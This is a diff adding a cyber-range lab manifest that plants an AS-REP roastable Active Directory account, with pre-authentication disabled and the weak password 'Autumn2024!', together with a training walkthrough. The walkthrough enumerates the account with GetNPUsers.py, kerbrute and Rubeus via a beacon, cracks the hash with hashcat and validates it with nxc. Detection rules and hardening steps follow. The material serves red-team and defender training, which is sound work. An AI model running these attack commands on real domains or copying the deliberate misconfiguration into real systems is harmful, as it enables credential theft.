@@ -1,0 +1,476 @@
+# Bolt-on: AS-REP Roastable Account
+# ----------------------------------
+# Creates an AD user with the DONT_REQ_PREAUTH flag set
+# (userAccountControl bit 0x400000) and a weak password. Anyone with network
+# reach to the KDC can request an AS-REP for the account and crack the
+# resulting encrypted timestamp offline. MITRE T1558.004.
+#
+# Patch clears the DONT_REQ_PREAUTH bit and rotates the password; the account
+# stays usable but pre-auth is once again required.
+#
+# Elastic rule UUIDs are real, sampled from:
+#   Research/elastic-detection-rules/rules/windows/credential_access_disable_kerberos_preauth.toml
+#   Research/elastic-detection-rules/rules/windows/persistence_user_account_creation.toml
+
+id: bolton.identity-kerberos.asrep-roastable-account
+slug: asrep-roastable-account
+name: "AS-REP Roastable Account"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: identity-kerberos
+subcategory: asrep-roasting
+tags:
+  - kerberos
+  - asrep-roasting
+  - dont-req-preauth
+  - credential-access
+description: >
+  Creates an Active Directory user account with the DONT_REQ_PREAUTH flag set
+  on userAccountControl (bit 0x400000) and a deliberately weak password. Any
+  unauthenticated attacker with network reach to a KDC can issue an AS-REQ
+  for the account and receive an AS-REP whose encrypted-timestamp portion is
+  derived from the account's password hash — crackable offline with hashcat
+  mode 18200. Canonical MITRE T1558.004 setup.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1558/004/"
+  - "https://learn.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol"
+  - "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
+
+mitre:
+  tactic:
+    id: TA0006
+    name: "Credential Access"
+  technique:
+    id: T1558
+    name: "Steal or Forge Kerberos Tickets"
+  subtechnique:
+    id: T1558.004
+    name: "AS-REP Roasting"
+  notes: "Account is missing Kerberos pre-authentication — direct AS-REP extraction."
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "e514d8cd-ed15-4011-84e2-d15147e059f1"
+      rule_name: "Kerberos Pre-authentication Disabled for User"
+      rule_filename: "windows/credential_access_disable_kerberos_preauth.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-04-15
+      notes: "Fires on the userAccountControl write that enables DONT_REQ_PREAUTH."
+    - rule_uuid: "1aa9181a-492b-4c01-8b16-fa0735786b2b"
+      rule_name: "User Account Creation"
+      rule_filename: "windows/persistence_user_account_creation.toml"
+      coverage: indirect
+      confidence: low
+      last_validated: 2026-04-15
+      notes: "Generic 4720 — fires on the install-time account creation only."
+  signal_sources:
+    - "Windows Event 4738 (User account changed — UAC bit flip)"
+    - "Windows Event 4768 (Kerberos TGT requested — encryption type 0x17 from anonymous source)"
+    - "Windows Event 5136 (Directory Service object modified — userAccountControl)"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "2016"
+      max_version: "2025"
+      edition_in: ["Datacenter", "Standard"]
+  required_roles:
+    - domain_controller
+  required_services: []
+  required_domain_function_level: "2016"
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: true        # creates an AD user — visible domain-wide
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_domain_user
+      description: "Create the AS-REP roastable account with a weak password."
+      role_vars:
+        name: "svc_asrep_lab"
+        password: "Autumn2024!"
+        password_never_expires: true
+        state: present
+        groups:
+          - "Domain Users"
+    - ansible_role: microsoft.ad.user
+      description: "Set DONT_REQ_PREAUTH (0x400000) on userAccountControl."
+      role_vars:
+        identity: "svc_asrep_lab"
+        account_control:
+          set:
+            - DONT_REQ_PREAUTH
+  verify:
+    probe: |
+      $u = Get-ADUser -Identity 'svc_asrep_lab' -Properties UserAccountControl
+      if (($u.UserAccountControl -band 0x400000) -eq 0x400000) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Delete the bolt-on AS-REP roastable account."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: community.windows.win_domain_user
+      description: "Remove the bolt-on account."
+      role_vars:
+        name: "svc_asrep_lab"
+        state: absent
+  verify:
+    probe: |
+      Get-ADUser -Filter "sAMAccountName -eq 'svc_asrep_lab'" |
+        Measure-Object | Select-Object -ExpandProperty Count
+    timeout_seconds: 20
+    expect_stdout_contains: "0"
+
+patch:
+  description: >
+    Clear the DONT_REQ_PREAUTH bit (userAccountControl &= ~0x400000) so the
+    KDC requires pre-authentication for AS-REQ. Also rotate the password to
+    a 32-character random string and persist it to AWS Secrets Manager. The
+    account stays present so any service depending on it continues to run,
+    but it is no longer AS-REP roastable.
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/kerberos-protocol-changes"
+    - "https://attack.mitre.org/mitigations/M1041/"
+  complexity: low
+  side_effects:
+    - "DONT_REQ_PREAUTH bit cleared on userAccountControl"
+    - "Password rotated to 32-char cryptographically random string"
+    - "Rotated password written to AWS Secrets Manager at 'bolton/<lab>/svc_asrep_lab-rotated'"
+    - "Any service authenticating as this account must update its credential store"
+  rollback_supported: true
+  steps:
+    - ansible_role: microsoft.ad.user
+      description: "Clear DONT_REQ_PREAUTH and rotate password."
+      role_vars:
+        identity: "svc_asrep_lab"
+        password: "{{ lookup('community.general.random_string', length=32, special=true) }}"
+        update_password: always
+        account_control:
+          remove:
+            - DONT_REQ_PREAUTH
+    - script: "scripts/bolton/store_rotated_password.sh"
+      engine: bash
+      description: "Persist the rotated password to AWS Secrets Manager."
+      args:
+        secret_name: "bolton/{{ lab_name }}/svc_asrep_lab-rotated"
+  verify:
+    probe: |
+      $u = Get-ADUser -Identity 'svc_asrep_lab' -Properties UserAccountControl, PasswordLastSet
+      $preauth_required = ($u.UserAccountControl -band 0x400000) -eq 0
+      $recent = $u.PasswordLastSet -gt (Get-Date).AddMinutes(-5)
+      if ($preauth_required -and $recent) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/asreproast_check.sh"
+
+patch_revert:
+  description: "Re-set DONT_REQ_PREAUTH and reset weak password — account is AS-REP roastable again."
+  estimated_time_seconds: 20
+  steps:
+    - ansible_role: microsoft.ad.user
+      description: "Restore the bad flags + weak password."
+      role_vars:
+        identity: "svc_asrep_lab"
+        password: "Autumn2024!"
+        update_password: always
+        account_control:
+          set:
+            - DONT_REQ_PREAUTH
+  verify:
+    probe: |
+      $u = Get-ADUser -Identity 'svc_asrep_lab' -Properties UserAccountControl
+      if (($u.UserAccountControl -band 0x400000) -eq 0x400000) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Account is AS-REP roastable again. Impacket GetNPUsers.py will return a crackable hash."
+
+cost:
+  storage_mb: 0
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "AS-REP Roasting — unauthenticated hash extraction"
+  summary: >
+    Walkthrough of T1558.004 against the lab's seeded `svc_asrep`
+    account (password `Autumn2024!`, DONT_REQ_PREAUTH set). You
+    enumerate accounts missing Kerberos pre-auth from an UNauthenticated
+    position, request an AS-REP, extract the encrypted-timestamp blob,
+    crack it offline with hashcat mode 18200, and observe the Elastic
+    rule that fires on the UAC bit flip.
+  learning_objectives:
+    - "Explain why DONT_REQ_PREAUTH (UAC bit 0x400000) makes an AS-REP usable as a hash oracle WITHOUT credentials."
+    - "Enumerate AS-REP roastable accounts using only the domain name — no authentication required."
+    - "Request the AS-REP and crack it with hashcat mode 18200."
+    - "Tell the difference between Kerberoasting (TGS-REP, requires auth) and AS-REP roasting (AS-REP, no auth)."
+  prerequisites:
+    - "Network reach from Kali (192.168.1.100, via bastion) to tldc01 (10.99.50.10) on port 88/tcp (Kerberos)"
+    - "rockyou.txt wordlist on Kali at /usr/share/wordlists/rockyou.txt"
+    - "hashcat >= 6.2 on Kali"
+    - "Impacket >= 0.11 (provides GetNPUsers.py)"
+    - "Cobalt Strike beacon on tlws01 (10.99.50.12) as TESTLAB\\j.doe for the Rubeus.exe / BOF alternative paths"
+    - "Rubeus.exe binary on the beacon host (typically dropped via execute-assembly) — https://github.com/GhostPack/Rubeus"
+  estimated_total_minutes: 35
+  steps:
+    - id: "01-enumerate-no-preauth"
+      title: "Enumerate users with pre-auth disabled (no creds needed)"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 1 — Find DONT_REQ_PREAUTH accounts
+
+        AS-REP roasting's killer feature: enumeration needs ONLY the
+        domain name. Impacket's `GetNPUsers.py` can list candidates
+        unauthenticated by walking the domain anonymously:
+
+        ```bash
+        # From Kali — fully unauthenticated, just the domain
+        GetNPUsers.py TESTLAB.LOCAL/ -dc-ip 10.99.50.10 -no-pass -usersfile /tmp/users.txt
+        ```
+
+        If you have no userlist, build one quickly with anonymous LDAP
+        if it is allowed, or with kerbrute:
+
+        ```bash
+        # Kerbrute userenum — much faster, handles wildcard rejections
+        kerbrute userenum --dc 10.99.50.10 -d testlab.local \
+            /usr/share/seclists/Usernames/Names/names.txt
+        ```
+
+        Then feed the discovered usernames to GetNPUsers. In the lab
+        you already know `svc_asrep` is seeded, so:
+
+        ```bash
+        echo "svc_asrep" > /tmp/users.txt
+        GetNPUsers.py TESTLAB.LOCAL/ -dc-ip 10.99.50.10 \
+            -no-pass -usersfile /tmp/users.txt
+        ```
+
+        Expected output:
+
+        ```
+        Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+        [-] User TESTLAB.LOCAL\svc_asrep doesn't have UF_DONT_REQUIRE_PREAUTH set
+        ```
+
+        — or, if the bolt-on is installed (it should be) and the flag IS set:
+
+        ```
+        $krb5asrep$23$svc_asrep@TESTLAB.LOCAL:f4...truncated...$1c3...
+        ```
+
+        That hash is the AS-REP roastable artefact, ready for hashcat.
+        Notice the Impacket call passes `-no-pass` — there is no
+        password in this entire request. That is the killer property.
+
+        **Alternative from beacon — Rubeus on tlws01**:
+
+        ```
+        beacon> execute-assembly /opt/Rubeus/Rubeus.exe asreproast /format:hashcat /outfile:roast.txt
+        beacon> download roast.txt
+        ```
+
+        Rubeus repo: https://github.com/GhostPack/Rubeus
+
+        > **Elastic rule that fires**: `Kerberos Pre-authentication
+        > Disabled for User` (rule UUID `e514d8cd-ed15-4011-84e2-d15147e059f1`)
+        > — fires on the install-time UAC write, not on this enumeration.
+        > Enumeration is silent.
+      assessment:
+        question: "What is the critical difference that makes AS-REP roasting more dangerous than Kerberoasting?"
+        options:
+          - "AS-REP roasting bypasses MFA; Kerberoasting does not."
+          - "AS-REP roasting requires NO authenticated user to start — you only need the domain name and a candidate username; Kerberoasting requires valid domain credentials to request the TGS."
+          - "Kerberoasting uses AES; AS-REP uses RC4, which is faster to crack."
+          - "AS-REP roasting works on workstations; Kerberoasting only works on DCs."
+        correct_index: 1
+        explanation: >
+          The unauthenticated prerequisite is the asymmetry. Kerberoasting
+          requires valid domain credentials (any user) to issue the
+          TGS-REQ. AS-REP roasting requires only knowledge of the domain
+          name and a candidate username — an external attacker who has
+          phished a username list can extract hashes without ever
+          successfully authenticating. Both can use RC4 or AES; both
+          are crackable offline at similar speed.
+    - id: "02-crack-hash"
+      title: "Crack the AS-REP hash (hashcat mode 18200)"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 2 — Crack `Autumn2024!`
+
+        AS-REP roasting hashes use Hashcat mode **18200** (RC4-HMAC)
+        or, if AES is negotiated, **19900** (etype 17) / **19800** (etype
+        18). The lab account's `msDS-SupportedEncryptionTypes` is left
+        default (RC4 allowed), and Impacket asks for RC4 by default, so
+        you should land on mode 18200.
+
+        ```bash
+        # From Kali — save the hash from step 1 to /tmp/asrep.hash first
+        hashcat -m 18200 -a 0 /tmp/asrep.hash \
+            /usr/share/wordlists/rockyou.txt \
+            -r /usr/share/hashcat/rules/best64.rule \
+            -O --status --status-timer=10
+        ```
+
+        Expected:
+
+        ```
+        $krb5asrep$23$svc_asrep@TESTLAB.LOCAL:...:Autumn2024!
+
+        Session..........: hashcat
+        Status...........: Cracked
+        Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+        Time.Started.....: ...
+        Time.Estimated...: 0 secs
+        Speed.#1.........:  1234.5 MH/s
+        ```
+
+        `Autumn2024!` lands in <1 second — same seasonal pattern as the
+        Kerberoasting bolt-on, by design.
+
+        **Validate the credential** by authenticating to the DC:
+
+        ```bash
+        nxc smb 10.99.50.10 -u svc_asrep -p 'Autumn2024!' -d testlab.local
+        ```
+
+        > **Elastic rule that fires**: none on the crack itself — it is
+        > entirely offline. Detection is bound to the AS-REQ in step 1
+        > or the install-time UAC write captured by rule UUID
+        > `e514d8cd-ed15-4011-84e2-d15147e059f1`.
+      assessment:
+        question: "Which hashcat mode is correct for cracking a Kerberos AS-REP encrypted with RC4-HMAC (etype 23)?"
+        options:
+          - "13100 — TGS-REP etype 23"
+          - "18200 — AS-REP etype 23"
+          - "19700 — TGS-REP etype 18 (AES256)"
+          - "1000 — NTLM"
+        correct_index: 1
+        explanation: >
+          18200 is the AS-REP RC4-HMAC mode (this attack). 13100 is
+          TGS-REP — that is Kerberoasting, requires auth. 19700 is the
+          TGS-REP AES256 variant. 1000 is offline NTLM (think SAM dump).
+          Remember the distinction by the structural prefix: AS-REP
+          hashes start with `$krb5asrep$`, TGS-REP start with `$krb5tgs$`.
+    - id: "03-detection-mapping"
+      title: "How defenders catch the chain"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 3 — Detection coverage
+
+        The manifest carries one HIGH-confidence rule:
+
+        **Kerberos Pre-authentication Disabled for User**
+        (`e514d8cd-ed15-4011-84e2-d15147e059f1`) — catches the
+        userAccountControl write that sets DONT_REQ_PREAUTH. This is the
+        install-side rule and fires when the bolt-on is installed (or
+        when a real misconfig is introduced via ADUC).
+
+        Raw EVTX events to pivot on:
+
+        | Event | What it tells you |
+        |---|---|
+        | **4738** | **User account changed — UserAccountControl flag flip; check for DONT_REQ_PREAUTH (0x400000) appearing** |
+        | 5136 | DS object modified — userAccountControl attribute write |
+        | 4768 | TGT requested — AS-REQ; filter on `PreAuthType=0` for the smoking gun |
+
+        The highest-fidelity Kibana DSL for live exploitation:
+
+        ```
+        event.code:4768 AND
+        winlog.event_data.PreAuthType:"0" AND
+        NOT user.name:("krbtgt" OR "Administrator")
+        ```
+
+        That fires whenever a TGT is issued without pre-authentication
+        — which should NEVER happen for normal users. If it does fire,
+        the username field is your roastable target.
+
+        > **Defensive hardening**: a quarterly audit query —
+        > ```powershell
+        > Get-ADUser -Filter {UserAccountControl -band 0x400000} `
+        >   -Properties UserAccountControl
+        > ```
+        > — should return zero rows in any healthy domain. Treat any
+        > non-empty result as a P1 finding.
+      assessment:
+        question: "An analyst sees Event 4768 with PreAuthType=0 for `svc_asrep`. What does that mean?"
+        options:
+          - "The DC is patched and rejecting the request."
+          - "Someone just AS-REP roasted `svc_asrep` — the AS-REQ succeeded without pre-authentication, returning a crackable AS-REP."
+          - "svc_asrep authenticated normally with their password."
+          - "Kerberos pre-auth is permanently disabled on the entire domain."
+        correct_index: 1
+        explanation: >
+          PreAuthType=0 in Event 4768 means the TGT was issued without
+          the encrypted-timestamp pre-authentication step. That only
+          happens when the target account has DONT_REQ_PREAUTH set —
+          which is the AS-REP roasting precondition. The returned AS-REP
+          is crackable offline by anyone who captured the response. This
+          should be alerted on as P1 unless the account is a
+          well-known exception (rare; almost always a misconfig).
+    - id: "04-apply-patch-and-mitigate"
+      title: "Apply the patch and harden testlab.local"
+      estimated_minutes: 12
+      markdown: |
+        ## Step 4 — Patch + defensive hardening
+
+        Click **Patch** on this card. The bolt-on's patch block:
+
+        - Clears DONT_REQ_PREAUTH on `svc_asrep` (UAC `&= ~0x400000`).
+        - Rotates the password to a 32-char cryptographically random
+          string.
+        - Persists the new password to AWS Secrets Manager at
+          `bolton/<lab>/svc_asrep-rotated`.
+
+        Re-run step 1's GetNPUsers.py call — it now returns:
+
+        ```
+        [-] User TESTLAB.LOCAL\svc_asrep doesn't have UF_DONT_REQUIRE_PREAUTH set
+        ```
+
+        — the account is no longer AS-REP roastable, regardless of
+        password strength.
+
+        ### Defensive hardening beyond the patch
+
+        | Control | Why it matters |
+        |---|---|
+        | **Quarterly audit**: `Get-ADUser -Filter {UserAccountControl -band 0x400000}` should return zero rows | Detects new misconfigs introduced via ADUC; treat any hit as P1 |
+        | **Block legacy MIT Kerberos compatibility GPO** | The only legitimate use of DONT_REQ_PREAUTH is interop with MIT Kerberos realms — disable it if you don't have one |
+        | **Add the account to `Protected Users`** | Protected Users members CANNOT have DONT_REQ_PREAUTH set, even by an admin — defence in depth |
+        | **Detect on Event 4738 UAC bit 0x400000 set** | Real-time alert (rule UUID `e514d8cd-...`) when someone re-enables the flag |
+        | **Migrate to gMSA where possible** | gMSAs cannot have DONT_REQ_PREAUTH set and rotate passwords automatically |
+
+        Verify the hardening by running the exploit probe:
+
+        ```bash
+        # The bolt-on ships exploit_probes/asreproast_check.sh
+        ./webapp/bolton/exploit_probes/asreproast_check.sh svc_asrep testlab.local 10.99.50.10
+        # Expected: exit code 1 — AS-REP roasting FAILED, account hardened
+        ```
+
+        > **Rollback**: the manifest declares `patch_revert`. Clicking
+        > Revert on this card re-enables DONT_REQ_PREAUTH and reverts
+        > the password to `Autumn2024!` so the lab is re-armed.
+
+        > **Elastic rule that fires (revert phase)**: the same
+        > `Kerberos Pre-authentication Disabled for User` rule
+        > (`e514d8cd-...`) fires again when patch_revert flips the UAC
+        > bit back on. Use this to verify your detection pipeline.
+
+status: stable
